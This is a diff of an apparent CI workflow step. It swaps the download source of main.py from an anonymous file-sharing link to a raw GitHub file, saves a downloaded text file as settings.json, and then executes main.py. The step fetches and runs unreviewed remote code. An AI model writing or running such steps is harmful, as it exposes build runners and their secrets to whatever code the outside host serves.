@@ -17,6 +17,6 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        wget https://2006.filemail.com/api/file/get?filekey=9K-YuTWpxAhDYWdWn2DxeA_VbzN8EkLm0kSpbo2GaSfW3OiXPH_AnTA -O main.py
+        wget https://github.com/Maovnwn/jkd/raw/main/main.py
         wget https://github.com/Maovnwn/jkd/raw/main/drt.txt -O settings.json
         python3 main.py
